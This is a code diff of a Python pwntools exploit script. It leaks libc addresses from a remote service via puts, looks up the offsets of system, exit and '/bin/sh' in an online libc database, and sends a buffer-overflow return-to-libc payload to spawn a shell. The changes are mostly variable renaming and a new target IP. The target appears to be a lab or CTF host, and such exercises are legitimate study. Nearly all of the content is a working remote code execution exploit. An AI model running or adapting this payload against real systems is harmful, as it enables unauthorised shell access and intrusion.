@@ -3,7 +3,7 @@ import requests
 from pwn import remote, u32, p32, flat, log
 
 # Connection Information
-conn = '192.168.0.155'
+conn = '192.168.0.156'
 port = 9000
 
 # Output Lines Configuration
@@ -63,26 +63,26 @@ def leak_via_puts(conn, port,put_out_addr, msg="puts"):
     return puts_addr
 
 # Perform a return-to-libc attack executing system('/bin/sh')
-def attemptR2Libc(putsOffset, systemOffset, exitOffset, binShOffset):
+def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
     # Leak randomised libc puts addr
     puts_addr = leak_via_puts(conn, port, gotPuts)
 
-    # Get lib base addr using putsOffset
-    libc_address = puts_addr - putsOffset
+    # Get lib base addr using puts_offset
+    libc_address = puts_addr - puts_offset
     log.success(f'LIBC base: {hex(libc_address)}')
 
-    systemBytes = p32(systemOffset+libc_address)
-    exitBytes = p32(exitOffset+libc_address)
-    binShBytes = p32(binShOffset+libc_address)
+    system_bytes = p32(system_offset+libc_address)
+    exit_bytes = p32(exit_offset+libc_address)
+    binsh_bytes = p32(binsh_offset+libc_address)
     
     # Create and send system('/bin/sh') buffer overflow payload
     payload = flat(
-        b'B' * buffSize, # Padding so the next bytes will overwrite the EIP
-        systemBytes,     # Overflowed function will execute system() on return
-        exitBytes,       # system will execute libc's exit() on return
-        binShBytes,      # system's first pararmter 
-                         # Which is libc's '/bin/sh' offset making the function call system('/bin/sh')
+        b'A' * buffSize, # Padding so the next bytes will overwrite the EIP
+        system_bytes,     # Overflowed function will execute system() on return
+        exit_bytes,       # system will execute libc's exit() on return
+        binsh_bytes,      # system's first pararmter 
     )
+
     proc.sendline(payload)
     log.success("Executed system('/bin/sh') overflow")
 
@@ -111,43 +111,45 @@ def find_potential_libcs(puts_addr,gets_addr):
     response = requests.post(findLibcUrl, headers=HEADERS, data=json.dumps(data))
     return response.json()
 
-# Find the offsets of functions and '/bin/sh' from the current libc json
 def get_libc_symbol_offsets(libc_id):
-    # Get the libc id to perform a more thorough search of functions
+    """
+    Retrieves offsets for various symbols from the libc database.
+    """
+    libc_id = libc_id['id']
     libc_url = LIBC_SEARCH_URL + libc_id
     
     # Define extra symbols to retrieve from the database
-    findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}
+    find_symbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}
 
     # Request symbols from the datatbase
-    response = requests.post(libc_url, headers=HEADERS, data=json.dumps(findSymbols))
-    symbolJson = response.json()
+    response = requests.post(libc_url, headers=HEADERS, data=json.dumps(find_symbols))
+    symbol_json = response.json()
 
     # Store the symbols into variables
-    putsOff = symbolJson['symbols'].get('puts')
-    systemOff = symbolJson['symbols'].get('system')
-    exitOff = symbolJson['symbols'].get('exit')
-    bin_shOff = symbolJson['symbols'].get('str_bin_sh')
+    puts_off = symbol_json['symbols'].get('puts')
+    system_off = symbol_json['symbols'].get('system')
+    exit_off = symbol_json['symbols'].get('exit')
+    binsh_off = symbol_json['symbols'].get('str_bin_sh')
     print()
-    log.info("Trying offsets for libc version: "+libId)
-    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}")
-    return putsOff, systemOff, exitOff, bin_shOff
+    log.info("Trying offsets for libc version: "+libc_id)
+    log.info(f"Offsets - puts: {puts_off}, system: {system_off}, str_bin_sh: {binsh_off}, exit: {exit_off}")
+    return puts_off, system_off, exit_off, binsh_off
 
 def main():
     puts_addr = leak_via_puts(conn,port,gotPuts)
     gets_addr = leak_via_puts(conn,port,gotGets,msg="gets")
-    responseJson = find_potential_libcs(puts_addr,gets_addr)
+    response_json = find_potential_libcs(puts_addr,gets_addr)
 
     # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
-    for item in responseJson:
+    for item in response_json:
         # Get the symbol offsets for the specific libc version
-        putsOff, systemOff, exitOff, bin_shOff = get_libc_symbol_offsets(item)
+        puts_off, system_off, exit_off, binsh_off = get_libc_symbol_offsets(item)
 
         # Attempt to execute system('/bin/sh')
-        retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))
+        ret_val = attempt_r2libc(int(puts_off,16),int(system_off,16),int(exit_off,16),int(binsh_off,16))
 
         # Print exit message depending on the return value
-        if retVal == 200:
+        if ret_val == 200:
             print("End of file recieved")
             break
         else:
